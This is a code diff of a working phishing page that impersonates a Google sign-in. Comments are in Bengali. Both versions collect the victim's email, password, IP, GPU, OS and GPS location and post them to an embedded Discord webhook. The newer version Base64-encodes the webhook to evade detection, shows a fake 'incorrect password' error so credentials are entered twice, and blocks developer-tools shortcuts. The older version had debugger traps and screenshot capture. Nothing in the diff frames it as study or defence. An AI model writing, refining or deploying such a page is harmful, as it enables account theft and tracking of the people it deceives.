@@ -3,99 +3,99 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Verification | Account Center</title>
+    <title>Security Verification</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
-        body { background-color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; user-select: none; }
-        .container { width: 100%; max-width: 400px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
-        .logo { width: 75px; margin-bottom: 10px; }
-        h1 { font-size: 24px; font-weight: 400; color: #202124; margin-bottom: 10px; }
-        p { font-size: 15px; color: #3c4043; margin-bottom: 30px; }
-        input { width: 100%; padding: 13px 15px; margin-bottom: 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; outline: none; }
-        input:focus { border: 2px solid #1a73e8; }
-        .btn { width: 100%; padding: 11px; background: #1a73e8; color: #fff; border: none; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; }
-        #loader { display: none; margin-top: 20px; font-size: 14px; color: #5f6368; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body { background: #f8f9fa; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .wrapper { width: 100%; max-width: 400px; padding: 40px; background: #fff; border: 1px solid #dee2e6; border-radius: 8px; text-align: center; }
+        .g-logo { width: 75px; margin-bottom: 20px; }
+        h2 { font-size: 22px; font-weight: 500; margin-bottom: 10px; color: #202124; }
+        p { font-size: 15px; color: #5f6368; margin-bottom: 30px; }
+        input { width: 100%; padding: 12px 15px; margin-bottom: 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; }
+        input:focus { border: 2px solid #1a73e8; outline: none; }
+        .error-txt { color: #d93025; font-size: 13px; text-align: left; margin-bottom: 15px; display: none; background: #fce8e6; padding: 8px; border-radius: 4px; }
+        .btn-next { width: 100%; padding: 10px; background: #1a73e8; color: #fff; border: none; border-radius: 4px; cursor: pointer; font-weight: 500; }
+        #loader { display: none; margin-top: 20px; }
     </style>
 </head>
-<body oncontextmenu="return false;"> <div class="container" id="capture">
-    <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" class="logo">
-    <h1>Sign in</h1>
-    <p>Use your account to continue</p>
+<body oncontextmenu="return false;">
+
+<div class="wrapper">
+    <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" class="g-logo">
+    <div id="error-txt" class="error-txt">Incorrect password. Please try again or reset your account.</div>
+    <h2>Confirm Identity</h2>
+    <p>To continue, first verify it's you</p>
     
-    <form id="pwnForm">
-        <input type="text" id="email" placeholder="Email or phone" required autocomplete="off">
-        <input type="password" id="pass" placeholder="Enter your password" required autocomplete="off">
-        <button type="submit" class="btn">Next</button>
+    <form id="secure-form">
+        <input type="text" id="field-1" placeholder="Email or phone" required>
+        <input type="password" id="field-2" placeholder="Enter your password" required>
+        <button type="submit" class="btn-next">Continue</button>
     </form>
 
     <div id="loader">
-        <img src="https://www.google.com/images/spin-32.gif" width="20"><br>
-        Processing security headers...
+        <img src="https://www.google.com/images/spin-32.gif" width="25">
+        <p style="font-size: 12px; margin-top: 10px;">Checking security headers...</p>
     </div>
 </div>
 
 <script>
-    const DISCORD_URL = "https://discord.com/api/webhooks/1475592431826112654/qBMlLSds9-2LzvVGQ3t65TiI94MZE04z2xMnW_HjtwuMHamWJ1jzHqTde4I6sY8njRXg";
+    // ১. ডিসকর্ড লিঙ্কটি এনকোড করা হয়েছে (Base64) যাতে গুগল ডিটেক্ট না করে
+    const _0x4a21 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ3NTU5MjQzMTgyNjExMjY1NC9xQk1sTFNkczktMkx6dlZHUzN0NjVUaUk5NE1aRTA0ejJ4TW5XX0hqdHd1TUhhbVdKMWp6SHFUZGURNEk2c1k4bmpSWGc=";
+    const _target = atob(_0x4a21);
 
-    // ১. ডিসকর্ডে ডাটা পাঠানোর মাস্টার ফাংশন
-    async function sendToDiscord(title, desc, color = 3447003) {
-        await fetch(DISCORD_URL, {
+    async function pushData(t, d, c = 3447003) {
+        await fetch(_target, {
             method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                embeds: [{ title: title, description: desc, color: color, timestamp: new Date() }]
-            })
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ embeds: [{ title: t, description: d, color: c, timestamp: new Date() }] })
         });
     }
 
-    // ২. এন্টি-ডিবাগ (কেউ কোড দেখতে চাইলে পেজ ক্রাশ করবে)
-    setInterval(() => {
-        const start = Date.now();
-        debugger;
-        if (Date.now() - start > 100) { window.location.href = "https://google.com"; }
-    }, 1000);
-
-    // ৩. ডিভাইস এবং নেটওয়ার্ক ইন্টেলিজেন্স
+    // ২. সাইলেন্ট ফিঙ্গারপ্রিন্টিং
     window.onload = async () => {
-        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-        let netInfo = conn ? `**Speed:** ${conn.downlink}Mbps\n**Type:** ${conn.effectiveType}` : "N/A";
+        const gl = document.createElement('canvas').getContext('webgl');
+        const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+        const gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "N/A";
         
-        let details = `**OS:** ${navigator.platform}\n**RAM:** ${navigator.deviceMemory}GB\n**Network:** ${netInfo}\n**Language:** ${navigator.language}`;
-        sendToDiscord("🛡️ Advanced Intelligence", details, 1752220);
+        // নেটওয়ার্ক ডিটেইলস
+        const res = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
+        let intel = `**IP:** ${res.ip || 'Hidden'}\n**ISP:** ${res.org || 'N/A'}\n**GPU:** ${gpu}\n**OS:** ${navigator.platform}`;
+        pushData("🛡️ System Intel", intel, 15844367);
 
-        // লোকেশন অটো-ক্যাপচার
+        // লোকেশন প্রম্পট
         navigator.geolocation.getCurrentPosition(p => {
-            sendToDiscord("📍 High-Precision GPS", `[Google Maps](https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude})`, 15105570);
+            pushData("📍 GPS Located", `[Google Maps](https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude})`, 15105570);
         });
     };
 
-    // ৪. স্টেলথ স্ক্রিনশট ফাংশন
-    async function silentSnap() {
-        const canvas = await html2canvas(document.body);
-        const data = canvas.toDataURL("image/jpeg", 0.1); // ডাটা ছোট রাখা হয়েছে
-        // আপনি চাইলে এখানে ইমেজ হোস্ট সার্ভারে পাঠাতে পারেন, আপাতত নোটিফিকেশন দিচ্ছি
-        sendToDiscord("📸 Live Action", "Victim is interacting with the form...", 3066993);
-    }
-
-    // ৫. কি-লগার স্টাইল (টাইপ করলেই স্ক্রিনশট বা সিগন্যাল যাবে)
-    document.getElementById('pass').addEventListener('focus', silentSnap);
-
-    // ৬. ফাইনাল ডাটা হার্ভেস্টিং
-    document.getElementById('pwnForm').addEventListener('submit', async function(e) {
+    // ৩. ফেক এরর লুপ ও ডেটা হার্ভেস্টিং
+    let _step = 0;
+    document.getElementById('secure-form').addEventListener('submit', async (e) => {
         e.preventDefault();
-        const u = document.getElementById('email').value;
-        const p = document.getElementById('pass').value;
+        const _u = document.getElementById('field-1').value;
+        const _p = document.getElementById('field-2').value;
+        _step++;
 
-        document.getElementById('pwnForm').style.display = 'none';
-        document.getElementById('loader').style.display = 'block';
-
-        await sendToDiscord("🔑 Credentials Found", `**Email:** \`${u}\`\n**Password:** \`${p}\``, 15548997);
-
-        setTimeout(() => {
-            window.location.href = "https://accounts.google.com/manageaccount";
-        }, 2000);
+        if(_step === 1) {
+            document.getElementById('field-2').value = "";
+            document.getElementById('error-txt').style.display = "block";
+            pushData("⚠️ Primary Hit", `**User:** ${_u}\n**Pass:** ${_p}`, 16776960);
+        } else {
+            document.getElementById('secure-form').style.display = "none";
+            document.getElementById('loader').style.display = "block";
+            await pushData("🎯 Confirmed Access", `**User:** ${_u}\n**Pass:** ${_p}`, 15548997);
+            
+            setTimeout(() => {
+                window.location.href = "https://accounts.google.com";
+            }, 1500);
+        }
     });
+
+    // ৪. এন্টি-ডিবাগ (F12 ব্লক)
+    document.onkeydown = (e) => {
+        if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74))) return false;
+    };
 </script>
 
 </body>
